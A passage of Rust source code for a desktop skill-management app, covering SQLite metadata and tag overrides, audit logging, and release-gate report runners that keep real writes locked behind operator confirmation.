    category: &str,
    enabled: Option<bool>,
) -> Result<usize, String> {
    let category = compact_note(category);
    if source_ids.is_empty() {
        return Err("At least one source must be selected.".to_string());
    }
    if category.len() > 80 {
        return Err("Bulk source category is too long.".to_string());
    }
    if category.is_empty() && enabled.is_none() {
        return Err("Bulk source edit needs a category or enabled-state change.".to_string());
    }

    let sources = read_indexed_sources(connection)?;
    let mut updated = 0usize;
    let mut updated_ids: Vec<String> = Vec::new();

    for raw_id in source_ids {
        let source_id = compact_note(raw_id);
        if source_id.is_empty() || updated_ids.iter().any(|item| item == &source_id) {
            continue;
        }
        let source = sources
            .iter()
            .find(|item| item.id == source_id)
            .ok_or_else(|| format!("Cannot find indexed source {}.", source_id))?;
        let next_category = if category.is_empty() {
            source.category_id.as_str()
        } else {
            category.as_str()
        };
        let next_enabled = enabled.unwrap_or(source.enabled);
        set_source_metadata_override_in_connection(
            connection,
            &source.id,
            &source.name,
            &source.source_type,
            next_category,
            &source.note,
            next_enabled,
        )?;
        updated += 1;
        updated_ids.push(source_id);
    }

    if updated == 0 {
        return Err("No valid source rows were selected.".to_string());
    }

    let timestamp = unix_timestamp_string();
    connection
        .execute(
            "INSERT INTO audit_events (
                id, event_type, summary, detail_json, created_at
            ) VALUES (?1, 'source_bulk_metadata_updated', ?2, ?3, ?4)",
            params![
                format!("audit-source-bulk-{}", timestamp),
                "Bulk-updated source metadata overrides",
                serde_json::to_string(&serde_json::json!({
                    "sourceIds": updated_ids,
                    "category": category,
                    "enabled": enabled,
                    "scope": "v2-sqlite-only"
                }))
                .unwrap_or_else(|_| "{}".to_string()),
                timestamp
            ],
        )
        .map_err(|error| format!("Cannot write source bulk audit event: {}", error))?;

    Ok(updated)
}

fn set_skill_tags_in_connection(
    connection: &Connection,
    folder_name: &str,
    tags: &[String],
) -> Result<(), String> {
    let folder_name = compact_note(folder_name);
    let normalized_tags = normalize_tag_list(tags)?;
    let skill_id: Option<String> = connection
        .query_row(
            "SELECT id FROM skills WHERE folder_name = ?1 LIMIT 1",
            params![&folder_name],
            |row| row.get(0),
        )
        .optional()
        .map_err(|error| format!("Cannot locate skill {}: {}", folder_name, error))?;
    let skill_id = skill_id.ok_or_else(|| format!("Cannot find indexed skill {}.", folder_name))?;
    let timestamp = unix_timestamp_string();

    connection
        .execute(
            "DELETE FROM skill_tag_overrides WHERE skill_id = ?1",
            params![&skill_id],
        )
        .map_err(|error| format!("Cannot clear skill tag overrides: {}", error))?;
    for tag in &normalized_tags {
        let tag_id = upsert_tag(connection, tag)?;
        connection
            .execute(
                "INSERT OR IGNORE INTO skill_tag_overrides (
                    skill_id, tag_id, updated_at
                ) VALUES (?1, ?2, ?3)",
                params![&skill_id, tag_id, &timestamp],
            )
            .map_err(|error| format!("Cannot save skill tag override: {}", error))?;
    }

    write_audit_event(
        connection,
        "skill_tags_updated",
        "Updated skill tag overrides",
        serde_json::json!({
            "folderName": folder_name,
            "skillId": skill_id,
            "tags": normalized_tags,
            "scope": "v2-sqlite-only"
        }),
    )
}

fn set_source_tags_in_connection(
    connection: &Connection,
    source_id: &str,
    tags: &[String],
) -> Result<(), String> {
    let source_id = compact_note(source_id);
    let normalized_tags = normalize_tag_list(tags)?;
    let exists: Option<String> = connection
        .query_row(
            "SELECT id FROM sources WHERE id = ?1 LIMIT 1",
            params![&source_id],
            |row| row.get(0),
        )
        .optional()
        .map_err(|error| format!("Cannot locate source {}: {}", source_id, error))?;
    exists.ok_or_else(|| format!("Cannot find indexed source {}.", source_id))?;
    let timestamp = unix_timestamp_string();

    connection
        .execute(
            "DELETE FROM source_tag_overrides WHERE source_id = ?1",
            params![&source_id],
        )
        .map_err(|error| format!("Cannot clear source tag overrides: {}", error))?;
    for tag in &normalized_tags {
        let tag_id = upsert_tag(connection, tag)?;
        connection
            .execute(
                "INSERT OR IGNORE INTO source_tag_overrides (
                    source_id, tag_id, updated_at
                ) VALUES (?1, ?2, ?3)",
                params![&source_id, tag_id, &timestamp],
            )
            .map_err(|error| format!("Cannot save source tag override: {}", error))?;
    }

    write_audit_event(
        connection,
        "source_tags_updated",
        "Updated source tag overrides",
        serde_json::json!({
            "sourceId": source_id,
            "tags": normalized_tags,
            "scope": "v2-sqlite-only"
        }),
    )
}

fn set_preset_workspace_enabled_in_connection(
    connection: &Connection,
    preset_id: &str,
    workspace_id: &str,
    enabled: bool,
) -> Result<(), String> {
    let preset_id = compact_note(preset_id);
    let workspace_id = compact_note(workspace_id);
    let preset_exists: Option<String> = connection
        .query_row(
            "SELECT id FROM presets WHERE id = ?1 LIMIT 1",
            params![&preset_id],
            |row| row.get(0),
        )
        .optional()
        .map_err(|error| format!("Cannot locate preset {}: {}", preset_id, error))?;
    preset_exists.ok_or_else(|| format!("Cannot find preset {}.", preset_id))?;
    let workspace_exists: Option<String> = connection
        .query_row(
            "SELECT id FROM workspaces WHERE id = ?1 LIMIT 1",
            params![&workspace_id],
            |row| row.get(0),
        )
        .optional()
        .map_err(|error| format!("Cannot locate workspace {}: {}", workspace_id, error))?;
    workspace_exists.ok_or_else(|| format!("Cannot find workspace {}.", workspace_id))?;
    let timestamp = unix_timestamp_string();

    connection
        .execute(
            "INSERT INTO preset_workspaces (
                preset_id, workspace_id, enabled, updated_at
            ) VALUES (?1, ?2, ?3, ?4)
            ON CONFLICT(preset_id, workspace_id) DO UPDATE SET
                enabled = excluded.enabled,
                updated_at = excluded.updated_at",
            params![
                &preset_id,
                &workspace_id,
                if enabled { 1 } else { 0 },
                &timestamp
            ],
        )
        .map_err(|error| format!("Cannot save preset workspace policy: {}", error))?;

    write_audit_event(
        connection,
        "preset_workspace_updated",
        "Updated preset workspace distribution policy",
        serde_json::json!({
            "presetId": preset_id,
            "workspaceId": workspace_id,
            "enabled": enabled,
            "scope": "v2-sqlite-only"
        }),
    )
}

fn read_tag_overrides(
    connection: &Connection,
    target_type: &str,
) -> Result<Vec<TagOverrideRow>, String> {
    let (table_name, target_column, label) = match target_type {
        "skill" => ("skill_tag_overrides", "skill_id", "skill tag override"),
        "source" => ("source_tag_overrides", "source_id", "source tag override"),
        _ => return Err("Unsupported tag override target type.".to_string()),
    };
    let query = format!(
        "SELECT {target_column}, tag_id, updated_at FROM {table_name}
        ORDER BY lower({target_column}), lower(tag_id)"
    );
    let mut statement = connection
        .prepare(&query)
        .map_err(|error| format!("Cannot prepare {} query: {}", label, error))?;
    let rows = statement
        .query_map([], |row| {
            Ok(TagOverrideRow {
                target_id: row.get(0)?,
                tag_id: row.get(1)?,
                updated_at: row.get(2)?,
            })
        })
        .map_err(|error| format!("Cannot read {} rows: {}", label, error))?;

    collect_rows(rows, label)
}

fn read_preset_workspace_policies(
    connection: &Connection,
) -> Result<Vec<PresetWorkspacePolicy>, String> {
    let mut statement = connection
        .prepare(
            "SELECT preset_id, workspace_id, enabled, updated_at
            FROM preset_workspaces
            ORDER BY lower(preset_id), lower(workspace_id)",
        )
        .map_err(|error| format!("Cannot prepare preset workspace policy query: {}", error))?;
    let rows = statement
        .query_map([], |row| {
            Ok(PresetWorkspacePolicy {
                preset_id: row.get(0)?,
                workspace_id: row.get(1)?,
                enabled: row.get::<_, i64>(2)? != 0,
                updated_at: row.get(3)?,
            })
        })
        .map_err(|error| format!("Cannot read preset workspace policies: {}", error))?;

    collect_rows(rows, "preset workspace policy")
}

fn restore_tag_overrides(
    transaction: &rusqlite::Transaction<'_>,
    target_type: &str,
    overrides: &[TagOverrideRow],
    fallback_timestamp: &str,
) -> Result<(), String> {
    let (table_name, target_column, parent_table, label) = match target_type {
        "skill" => (
            "skill_tag_overrides",
            "skill_id",
            "skills",
            "skill tag override",
        ),
        "source" => (
            "source_tag_overrides",
            "source_id",
            "sources",
            "source tag override",
        ),
        _ => return Err("Unsupported tag override target type.".to_string()),
    };

    for override_row in overrides {
        let parent_exists = transaction
            .query_row(
                &format!("SELECT 1 FROM {parent_table} WHERE id = ?1 LIMIT 1"),
                params![&override_row.target_id],
                |row| row.get::<_, i64>(0),
            )
            .optional()
            .map_err(|error| {
                format!(
                    "Cannot validate {} parent {}: {}",
                    label, override_row.target_id, error
                )
            })?
            .is_some();
        if !parent_exists {
            continue;
        }

        let tag_exists = transaction
            .query_row(
                "SELECT 1 FROM tags WHERE id = ?1 LIMIT 1",
                params![&override_row.tag_id],
                |row| row.get::<_, i64>(0),
            )
            .optional()
            .map_err(|error| {
                format!(
                    "Cannot validate {} tag {}: {}",
                    label, override_row.tag_id, error
                )
            })?
            .is_some();
        if !tag_exists {
            continue;
        }

        let updated_at = if override_row.updated_at.trim().is_empty() {
            fallback_timestamp
        } else {
            override_row.updated_at.as_str()
        };
        transaction
            .execute(
                &format!(
                    "INSERT INTO {table_name} ({target_column}, tag_id, updated_at)
                    VALUES (?1, ?2, ?3)
                    ON CONFLICT({target_column}, tag_id) DO UPDATE SET
                        updated_at = excluded.updated_at"
                ),
                params![&override_row.target_id, &override_row.tag_id, updated_at],
            )
            .map_err(|error| {
                format!(
                    "Cannot restore {} {} -> {}: {}",
                    label, override_row.target_id, override_row.tag_id, error
                )
            })?;
    }

    Ok(())
}

fn restore_preset_workspace_policies(
    transaction: &rusqlite::Transaction<'_>,
    policies: &[PresetWorkspacePolicy],
    fallback_timestamp: &str,
) -> Result<(), String> {
    for policy in policies {
        let preset_exists = transaction
            .query_row(
                "SELECT 1 FROM presets WHERE id = ?1 LIMIT 1",
                params![&policy.preset_id],
                |row| row.get::<_, i64>(0),
            )
            .optional()
            .map_err(|error| {
                format!(
                    "Cannot validate preset workspace policy preset {}: {}",
                    policy.preset_id, error
                )
            })?
            .is_some();
        if !preset_exists {
            continue;
        }

        let workspace_exists = transaction
            .query_row(
                "SELECT 1 FROM workspaces WHERE id = ?1 LIMIT 1",
                params![&policy.workspace_id],
                |row| row.get::<_, i64>(0),
            )
            .optional()
            .map_err(|error| {
                format!(
                    "Cannot validate preset workspace policy workspace {}: {}",
                    policy.workspace_id, error
                )
            })?
            .is_some();
        if !workspace_exists {
            continue;
        }

        let updated_at = if policy.updated_at.trim().is_empty() {
            fallback_timestamp
        } else {
            policy.updated_at.as_str()
        };
        transaction
            .execute(
                "INSERT INTO preset_workspaces (
                    preset_id, workspace_id, enabled, updated_at
                ) VALUES (?1, ?2, ?3, ?4)
                ON CONFLICT(preset_id, workspace_id) DO UPDATE SET
                    enabled = excluded.enabled,
                    updated_at = excluded.updated_at",
                params![
                    &policy.preset_id,
                    &policy.workspace_id,
                    if policy.enabled { 1 } else { 0 },
                    updated_at
                ],
            )
            .map_err(|error| {
                format!(
                    "Cannot restore preset workspace policy {} -> {}: {}",
                    policy.preset_id, policy.workspace_id, error
                )
            })?;
    }

    Ok(())
}

fn run_release_gate_runner_in_connection(
    root: &Path,
    connection: &Connection,
    runner_id: &str,
) -> Result<(), String> {
    let runner_id = compact_note(runner_id);
    let timestamp = unix_timestamp_string();
    let report_folder = runner_report_folder(&runner_id);
    let (status, summary, report_body) = match runner_id.as_str() {
        "diagnostics-export" => {
            let snapshot = read_snapshot_from_database(root, connection)?;
            let git = git_runtime_diagnostic();
            let foreign_keys = foreign_key_diagnostic(connection)?;
            let latest_import = latest_source_import_diagnostic(root);
            let proxy_detected = [
                "HTTPS_PROXY",
                "HTTP_PROXY",
                "ALL_PROXY",
                "https_proxy",
                "http_proxy",
                "all_proxy",
            ]
            .iter()
            .any(|key| {
                std::env::var(key)
                    .map(|value| !value.trim().is_empty())
                    .unwrap_or(false)
            });
            let summary = format!(
                "排错报告已生成：{} 个 Skills、{} 个来源；Git={}；数据库外键异常={}。",
                snapshot.skills.len(),
                snapshot.sources.len(),
                git.get("available")
                    .and_then(Value::as_bool)
                    .map(|available| if available { "可用" } else { "未检测到" })
                    .unwrap_or("未知"),
                foreign_keys
                    .get("violationCount")
                    .and_then(Value::as_u64)
                    .unwrap_or(0)
            );
            let body = serde_json::json!({
                "kind": "ai-skillhub-support-report",
                "appVersion": env!("CARGO_PKG_VERSION"),
                "generatedAt": timestamp,
                "platform": {
                    "os": std::env::consts::OS,
                    "arch": std::env::consts::ARCH
                },
                "summary": snapshot.summary,
                "diagnostics": snapshot.diagnostics,
                "git": git,
                "network": {
                    "proxyConfigured": proxy_detected,
                    "proxyValuesIncluded": false
                },
                "database": foreign_keys,
                "latestSourceImport": latest_import,
                "privacy": {
                    "tokensIncluded": false,
                    "skillContentsIncluded": false,
                    "databaseFileIncluded": false,
                    "absolutePathsIncluded": false
                },
                "scope": "read-only-support",
                "root": "<AI_SKILLHUB_ROOT>"
            });
            ("ok".to_string(), summary, body)
        }
        "share-validation" => {
            let snapshot = read_snapshot_from_database(root, connection)?;
            let missing_reports = snapshot
                .release_reports
                .iter()
                .filter(|report| report.status == "missing")
                .count();
            let status = if missing_reports == 0 { "ok" } else { "warn" };
            let summary = if missing_reports == 0 {
                "Share validation plan passed from available v1/v2 report inputs.".to_string()
            } else {
                format!(
                    "Share validation still needs {} report input(s); no package was created.",
                    missing_reports
                )
            };
            let body = serde_json::json!({
                "kind": "v2-share-validation",
                "generatedAt": timestamp,
                "status": status,
                "missingReports": missing_reports,
                "checks": [
                    "diagnostics-readable",
                    "share-report-readable",
                    "zip-preview-readable",
                    "no-real-sync"
                ],
                "gate": "read-only"
            });
            (status.to_string(), summary, body)
        }
        "report-bundle" => build_report_bundle_report(root, connection, &timestamp)?,
        "write-execution-plan" => build_write_execution_plan_report(root, connection, &timestamp)?,
        "agent-sync-readiness" => {
            build_real_write_readiness_report(root, connection, &timestamp, "agent-sync")?
        }
        "release-package-readiness" => {
            build_real_write_readiness_report(root, connection, &timestamp, "release-package")?
        }
        "agent-sync-executor" => {
            build_real_write_execution_report(root, connection, &timestamp, "agent-sync")?
        }
        "release-package-executor" => {
            build_real_write_execution_report(root, connection, &timestamp, "release-package")?
        }
        "v2-completion-audit" => build_v2_completion_audit_report(root, connection, &timestamp)?,
        "release-package" => {
            let body = serde_json::json!({
                "kind": "v2-release-package-plan",
                "generatedAt": timestamp,
                "status": "locked",
                "blockedBy": [
                    "real sync is still locked",
                    "release candidate packaging runner is not enabled",
                    "final desktop QA must be passed first"
                ],
                "gate": "plan-only"
            });
            (
                "locked".to_string(),
                "Release package runner is still locked; generated a packaging plan only."
                    .to_string(),
                body,
            )
        }
        _ => return Err("Unsupported release gate runner.".to_string()),
    };

    let report_dir = private_state_dir(root).join("reports").join(report_folder);
    fs::create_dir_all(&report_dir)
        .map_err(|error| format!("Cannot create v2 report folder: {}", error))?;
    let json_path = report_dir.join(format!("{}-{}.json", runner_id, timestamp));
    let md_path = report_dir.join(format!("{}-{}.md", runner_id, timestamp));
    let latest_json_path = report_dir.join(format!("latest-{}.json", runner_id));
    let latest_md_path = report_dir.join(format!("latest-{}.md", runner_id));
    let manifest_path = report_dir.join(format!("{}-manifest-{}.json", runner_id, timestamp));
    let latest_manifest_path = report_dir.join(format!("latest-{}-manifest.json", runner_id));
    let report_json = serde_json::to_string_pretty(&report_body)
        .map_err(|error| format!("Cannot serialize runner report: {}", error))?;
    fs::write(&json_path, &report_json)
        .map_err(|error| format!("Cannot write runner JSON report: {}", error))?;
    fs::write(&latest_json_path, &report_json)
        .map_err(|error| format!("Cannot write latest runner JSON report: {}", error))?;
    let markdown_report = format!(
        "# {}\n\nStatus: `{}`\n\n{}\n\nJSON: `{}`\n\nLatest JSON: `{}`\n\nManifest: `{}`\n",
        runner_title(&runner_id),
        status,
        summary,
        path_file_name(&json_path),
        path_file_name(&latest_json_path),
        path_file_name(&latest_manifest_path)
    );
    fs::write(&md_path, &markdown_report)
        .map_err(|error| format!("Cannot write runner markdown report: {}", error))?;
    fs::write(&latest_md_path, &markdown_report)
        .map_err(|error| format!("Cannot write latest runner markdown report: {}", error))?;
    let generated_files = vec![
        path_file_name(&json_path),
        path_file_name(&md_path),
        path_file_name(&latest_json_path),
        path_file_name(&latest_md_path),
        path_file_name(&manifest_path),
        path_file_name(&latest_manifest_path),
    ];
    let generated_file_count = generated_files.len();
    let manifest_body = serde_json::json!({
        "kind": "v2-runner-export-manifest",
        "runnerId": runner_id,
        "runnerTitle": runner_title(&runner_id),
        "runnerType": report_folder,
        "status": status,
        "generatedAt": timestamp,
        "summary": summary,
        "exportFolder": report_dir.display().to_string(),
        "generatedFiles": generated_files,
        "fileCount": generated_file_count,
        "gate": "v2-report-only",
        "realWrites": false
    });
    let manifest_json = serde_json::to_string_pretty(&manifest_body)
        .map_err(|error| format!("Cannot serialize runner manifest: {}", error))?;
    fs::write(&manifest_path, &manifest_json)
        .map_err(|error| format!("Cannot write runner manifest: {}", error))?;
    fs::write(&latest_manifest_path, manifest_json)
        .map_err(|error| format!("Cannot write latest runner manifest: {}", error))?;

    connection
        .execute(
            "INSERT INTO operation_runs (
                id, runner_id, status, summary, report_path, created_at
            ) VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
            params![
                format!("operation-{}-{}", runner_id, timestamp),
                &runner_id,
                &status,
                &summary,
                md_path.display().to_string(),
                &timestamp
            ],
        )
        .map_err(|error| format!("Cannot save operation run: {}", error))?;

    write_audit_event(
        connection,
        "release_gate_runner",
        "Ran v2 release gate runner",
        serde_json::json!({
            "runnerId": runner_id,
            "status": status,
            "reportPath": md_path.display().to_string(),
            "latestMarkdownPath": latest_md_path.display().to_string(),
            "latestJsonPath": latest_json_path.display().to_string(),
            "manifestPath": latest_manifest_path.display().to_string(),
            "scope": "v2-report-only"
        }),
    )
}

fn git_runtime_diagnostic() -> Value {
    let mut command = Command::new("git");
    command.arg("--version");
    match command_output_with_timeout(&mut command, Duration::from_secs(5), "Git 版本检测超时。")
    {
        Ok(output) if output.status.success() => serde_json::json!({
            "available": true,
            "version": compact_note(&String::from_utf8_lossy(&output.stdout)),
            "error": ""
        }),
        Ok(output) => serde_json::json!({
            "available": false,
            "version": "",
            "error": compact_note(&String::from_utf8_lossy(&output.stderr))
                .chars()
                .take(240)
                .collect::<String>()
        }),
        Err(error) => serde_json::json!({
            "available": false,
            "version": "",
            "error": compact_note(&error).chars().take(240).collect::<String>()
        }),
    }
}

fn foreign_key_diagnostic(connection: &Connection) -> Result<Value, String> {
    let mut statement = connection
        .prepare("PRAGMA foreign_key_check")
        .map_err(|error| format!("Cannot prepare foreign key diagnostic: {}", error))?;
    let rows = statement
        .query_map([], |row| {
            Ok(serde_json::json!({
                "table": row.get::<_, String>(0)?,
                "rowId": row.get::<_, Option<i64>>(1)?,
                "parent": row.get::<_, String>(2)?,
                "foreignKeyId": row.get::<_, i64>(3)?
            }))
        })
        .map_err(|error| format!("Cannot run foreign key diagnostic: {}", error))?;
    let mut violations = Vec::new();
    for row in rows {
        if violations.len() >= 25 {
            break;
        }
        violations
            .push(row.map_err(|error| format!("Cannot decode foreign key diagnostic: {}", error))?);
    }
    Ok(serde_json::json!({
        "foreignKeysEnabled": true,
        "violationCount": violations.len(),
        "violations": violations
    }))
}

fn latest_source_import_diagnostic(root: &Path) -> Value {
    let report_dir = source_import_report_root(root);
    let Ok(entries) = fs::read_dir(&report_dir) else {
        return serde_json::json!({ "available": false });
    };
    let mut reports = entries
        .flatten()
        .filter_map(|entry| {
            let path = entry.path();
            let file_name = entry.file_name().to_string_lossy().to_string();
            if path.extension().and_then(|value| value.to_str()) != Some("json")
                || file_name.ends_with("-manifest.json")
            {
                return None;
            }
            let modified = entry
                .metadata()
                .ok()
                .and_then(|metadata| metadata.modified().ok())
                .unwrap_or(UNIX_EPOCH);
            Some((modified, path))
        })
        .collect::<Vec<_>>();
    reports.sort_by_key(|(modified, _)| std::cmp::Reverse(*modified));
    let Some((_, latest_path)) = reports.first() else {
        return serde_json::json!({ "available": false });
    };
    let Ok(text) = fs::read_to_string(latest_path) else {
        return serde_json::json!({ "available": false, "readable": false });
    };
    let Ok(payload) = serde_json::from_str::<Value>(&text) else {
        return serde_json::json!({ "available": true, "readable": false });
    };
    serde_json::json!({
        "available": true,
        "readable": true,
        "generatedAt": payload.get("generatedAt").cloned().unwrap_or(Value::Null),
        "status": payload.get("status").cloned().unwrap_or(Value::Null),
        "summary": payload.get("summary").cloned().unwrap_or(Value::Null),
        "downloadMethod": payload.get("downloadMethod").cloned().unwrap_or(Value::Null),
        "skillCount": payload.get("skillCount").cloned().unwrap_or(Value::Null),
        "promptCount": payload.get("promptCount").cloned().unwrap_or(Value::Null),
        "blockingChecks": payload.get("blockingChecks").cloned().unwrap_or_else(|| Value::Array(Vec::new()))
    })
}

fn build_report_bundle_report(
    root: &Path,
    connection: &Connection,
    timestamp: &str,
) -> Result<(String, String, Value), String> {
    let runners = read_indexed_operation_runners(connection, root)?;
    let mut ready_count = 0usize;
    let mut missing_count = 0usize;
    let mut inputs = Vec::new();

    for runner in runners
        .into_iter()
        .filter(|runner| runner.id != "report-bundle")
    {
        let latest_markdown_exists = Path::new(&runner.latest_markdown_path).exists();
        let latest_json_exists = Path::new(&runner.latest_json_path).exists();
        let manifest_exists = Path::new(&runner.manifest_path).exists();
        let available_count = [latest_markdown_exists, latest_json_exists, manifest_exists]
            .iter()
            .filter(|exists| **exists)
            .count();

        if available_count == 3 {
            ready_count += 1;
        } else {
            missing_count += 1;
        }

        inputs.push(serde_json::json!({
            "runnerId": runner.id,
            "runnerTitle": runner.title,
            "runnerType": runner.runner_type,
            "status": runner.status,
            "locked": runner.locked,
            "lastRunAt": runner.last_run_at,
            "latestMarkdown": path_file_name(Path::new(&runner.latest_markdown_path)),
            "latestJson": path_file_name(Path::new(&runner.latest_json_path)),
            "manifest": path_file_name(Path::new(&runner.manifest_path)),
            "availableFiles": available_count,
            "requiredFiles": 3
        }));
    }

    let status = if missing_count == 0 { "ok" } else { "warn" };
    let summary = format!(
        "Report bundle index generated: {} runner(s) ready, {} runner(s) missing latest exports; no release package was created.",
        ready_count, missing_count
    );
    let body = serde_json::json!({
        "kind": "v2-report-bundle-index",
        "generatedAt": timestamp,
        "status": status,
        "summary": summary,
        "inputs": inputs,
        "gate": "report-bundle-only",
        "realWrites": false,
        "privacy": "Only relative report file names are included; local AI SkillHub root paths are not embedded."
    });

    Ok((status.to_string(), summary, body))
}

fn build_write_execution_plan_report(
    root: &Path,
    connection: &Connection,
    timestamp: &str,
) -> Result<(String, String, Value), String> {
    let snapshot = read_snapshot_from_database(root, connection)?;
    let mut unlocked_count = 0usize;
    let mut blocked_count = 0usize;
    let gates = snapshot
        .write_gates
        .iter()
        .map(|gate| {
            if gate.unlocked {
                unlocked_count += 1;
            } else {
                blocked_count += 1;
            }
            serde_json::json!({
                "gateId": &gate.id,
                "title": &gate.title,
                "operationType": &gate.operation_type,
                "riskLevel": &gate.risk_level,
                "status": &gate.status,
                "unlocked": gate.unlocked,
                "summary": &gate.summary,
                "nextAction": &gate.next_action,
                "passingChecks": &gate.passing_checks,
                "blockingChecks": &gate.blocking_checks,
                "executionPreview": &gate.plan_steps,
                "rollbackPreview": &gate.rollback_steps
            })
        })
        .collect::<Vec<_>>();

    let status = if blocked_count == 0 {
        "ready"
    } else {
        "locked"
    };
    let summary = format!(
        "Write execution plan generated: {} gate(s), {} unlocked, {} blocked; no clone/pull/copy/extract/link/sync/package action was executed.",
        snapshot.write_gates.len(),
        unlocked_count,
        blocked_count
    );
    let body = serde_json::json!({
        "kind": "v2-write-execution-plan",
        "generatedAt": timestamp,
        "status": status,
        "summary": summary,
        "gates": gates,
        "executorStatus": "locked",
        "operatorConfirmationRequired": true,
        "realWrites": false,
        "writeBoundary": [
            "No GitHub clone or pull",
            "No local or zip copy/extract",
            "No Claude/Codex/Antigravity link or sync",
            "No release package generation"
        ]
    });

    Ok((status.to_string(), summary, body))
}

fn build_real_write_readiness_report(
    root: &Path,
    connection: &Connection,
    timestamp: &str,
    gate_id: &str,
) -> Result<(String, String, Value), String> {
    let snapshot = read_snapshot_from_database(root, connection)?;
    let gate = snapshot
        .write_gates
        .iter()
        .find(|gate| gate.id == gate_id)
        .ok_or_else(|| format!("Cannot find write gate {}.", gate_id))?;
    let self_check_label = match gate_id {
        "agent-sync" => "AI 工具同步解锁检查报告已生成",
        "release-package" => "发布打包解锁检查报告已生成",
        _ => "真实写入解锁检查报告已生成",
    };
    let unresolved_blockers = gate
        .blocking_checks
        .iter()
        .filter(|check| !check.contains(self_check_label))
        .cloned()
        .collect::<Vec<_>>();
    let can_execute_after_this_report = unresolved_blockers.is_empty();
    let status = if can_execute_after_this_report {
        "ready"
    } else {
        "blocked"
    };
    let summary = if can_execute_after_this_report {
        format!(
            "{} 的安全前置条件已满足；仍需要用户在界面里明确触发，才允许进入真实执行。",
            gate.title
        )
    } else {
        format!(
            "{} 仍有 {} 个阻断项；不会执行任何真实写入。",
            gate.title,
            unresolved_blockers.len()
        )
    };
    let body = serde_json::json!({
        "kind": "v2-real-write-readiness",
        "generatedAt": timestamp,
        "gateId": gate.id,
        "title": gate.title,
        "operationType": gate.operation_type,
        "status": status,
        "canExecuteAfterThisReport": can_execute_after_this_report,
        "operatorConsent": {
            "realWritesEnabled": snapshot.operator_consent.real_writes_enabled,
            "enabledAt": snapshot.operator_consent.enabled_at,
            "summary": snapshot.operator_consent.summary
        },
        "operatorConfirmationRequired": true,
        "realWrites": false,
        "passingChecks": gate.passing_checks,
        "blockingChecks": unresolved_blockers,
        "selfCheckSatisfiedByThisRun": self_check_label,
        "executionPreview": gate.plan_steps,
        "rollbackPreview": gate.rollback_steps,
        "writeBoundary": [
            "This runner only writes v2 reports and audit rows.",
            "No Claude/Codex/Antigravity directory is modified.",
            "No release package, tag, or GitHub Release is created."
        ]
    });

    Ok((status.to_string(), summary, body))
}

fn build_real_write_execution_report(
    root: &Path,
    connection: &Connection,
    timestamp: &str,
    gate_id: &str,
) -> Result<(String, String, Value), String> {
    let snapshot = read_snapshot_from_database(root, connection)?;
    let gate = snapshot
        .write_gates
        .iter()
        .find(|gate| gate.id == gate_id)
        .ok_or_else(|| format!("Cannot find write gate {}.", gate_id))?;

    let status = if gate.blocking_checks.is_empty() {
        "armed"
    } else {
        "blocked"
    };
    let summary = if gate.blocking_checks.is_empty() {
        format!(
            "{} 已进入最终执行就绪态；本次仍只写审计报告，真实写入必须由用户二次确认。",
            gate.title
        )
    } else {
        format!(
            "{} 最终执行被阻断：还有 {} 个安全条件未通过；没有执行真实写入。",
            gate.title,
            gate.blocking_checks.len()
        )
    };
    let managed_adapters = snapshot
        .agent_adapters
        .iter()
        .filter(|adapter| adapter.detected && adapter.enabled && adapter.managed)
        .map(|adapter| {
            serde_json::json!({
                "id": adapter.id,
                "name": adapter.name,
                "target": adapter.skills_path_hint
            })
        })
        .collect::<Vec<_>>();
    let package_preview = private_state_dir(root)
        .join("release-candidates")
        .join(format!("ai-skillhub-v2-{}", timestamp));
    let executor_preview = match gate_id {
        "agent-sync" => serde_json::json!({
            "executor": "agent-sync",
            "managedAdapters": managed_adapters,
            "sourceOfTruth": active_skills_dir(root).display().to_string(),
            "wouldBackupBeforeWrite": true,
            "wouldVerifyAfterWrite": true
        }),
        "release-package" => serde_json::json!({
            "executor": "release-package",
            "candidateFolder": package_preview.to_string_lossy().replace(root.to_string_lossy().as_ref(), "<AI_SKILLHUB_ROOT>"),
            "wouldGenerateSha256": true,
            "wouldExcludePrivateFolders": true,
            "wouldRequireGitStatusReview": true
        }),
        _ => serde_json::json!({
            "executor": gate_id
        }),
    };

    let body = serde_json::json!({
        "kind": "v2-real-write-execution-attempt",
        "generatedAt": timestamp,
        "gateId": gate.id,
        "title": gate.title,
        "operationType": gate.operation_type,
        "status": status,
        "armed": gate.blocking_checks.is_empty(),
        "operatorConsent": {
            "realWritesEnabled": snapshot.operator_consent.real_writes_enabled,
            "enabledAt": snapshot.operator_consent.enabled_at,
            "summary": snapshot.operator_consent.summary
        },
        "realWrites": false,
        "operatorConfirmationRequired": true,
        "confirmationPhrase": format!("EXECUTE {}", gate.id),
        "summary": summary,
        "passingChecks": gate.passing_checks,
        "blockingChecks": gate.blocking_checks,
        "executionPreview": gate.plan_steps,
        "rollbackPreview": gate.rollback_steps,
        "executorPreview": executor_preview,
        "writeBoundary": [
            "This runner is the final executor guard rail.",
            "It writes only v2 reports and audit rows in the current build.",
            "It never modifies Claude/Codex/Antigravity directories while any blocking check exists.",
            "It never creates release packages, tags, or GitHub Releases while any blocking check exists."
        ]
    });

    Ok((status.to_string(), summary, body))
}

fn build_v2_completion_audit_report(
    root: &Path,
    connection: &Connection,
    timestamp: &str,
) -> Result<(String, String, Value), String> {
    let snapshot = read_snapshot_from_database(root, connection)?;
    let checks = vec![
        completion_check(
            "sqlite-index",
            "SQLite index",
            snapshot.index.persisted && snapshot.index.skills_indexed > 0,
            "SQLite index exists and contains indexed Skills.",
            "Refresh the AI SkillHub SQLite index.",
        ),
        completion_check(
            "metadata-management",
            "Metadata management",
            !snapshot.tags.is_empty() && !snapshot.preset_distributions.is_empty(),
            "Tags, Source/Skill metadata, and Preset/workspace policies are available.",
            "Seed tags and Preset/workspace policies before release.",
        ),
        completion_check(
            "diagnostics",
            "Diagnostics",
            snapshot.diagnostics.available && snapshot.diagnostics.error == 0,
            "Diagnostics are readable and have no blocking errors.",
            "Run diagnostics export and resolve blocking errors.",
        ),
        completion_check(
            "desktop-qa",
            "Desktop QA",
            required_desktop_qa_passed(&snapshot.desktop_qa_checks),
            "All required desktop QA checks are marked passed.",
            "Complete default-window, DPI, Release Gate, snapshot, and build-guidance QA.",
        ),
        completion_check(
            "report-bundle",
            "Report bundle",
            operation_runner_has_latest(&snapshot.operation_runners, "report-bundle"),
            "Latest report bundle index exists.",
            "Run diagnostics/share/release plan runners, then run report-bundle.",
        ),
        completion_check(
            "write-gates",
            "Real write gates",
            snapshot
                .operation_runners
                .iter()
                .any(|runner| runner.id == "agent-sync-readiness" && runner.file_count > 0)
